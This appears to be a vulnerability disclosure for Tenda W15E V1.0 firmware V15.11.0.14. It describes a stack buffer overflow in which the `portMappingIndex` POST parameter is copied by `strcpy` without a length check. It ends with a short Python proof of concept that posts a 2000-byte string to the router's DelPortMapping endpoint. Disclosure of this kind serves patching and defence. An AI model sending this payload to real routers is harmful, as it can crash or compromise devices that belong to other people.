## Overview

- Firmware download website: https://www.tendacn.com/download/detail-2722.html

## Affected version

W15EV1.0 V15.11.0.14

## Vulnerability details

The Tenda W15EV1.0 V15.11.0.14 firmware has a stack overflow vulnerability in the `formDelPortMapping` function. The `pPortMapIndex` variable receives the `portMappingIndex` parameter from a POST request and is directly assigned to `strcpy`. However, since the user can control the input of `portMappingIndex `, the statement`strcpy((char *)sPortMapIndex, (const char *)pPortMapIndex);` can cause a buffer overflow. The user-provided  `portMappingIndex` can exceed the capacity of the `sPortMapIndex` array, triggering this security vulnerability.

![image-20240417100646839](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240417100646839.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/DelPortMapping"
payload = b"a"*2000

data = {
    	'portMappingIndex':payload,
    }
response = requests.post(url, data=data)
print(response.text)
```

![image-20240416114043980](https://raw.githubusercontent.com/abcdefg-png/images2/main/image-20240416114043980.png)
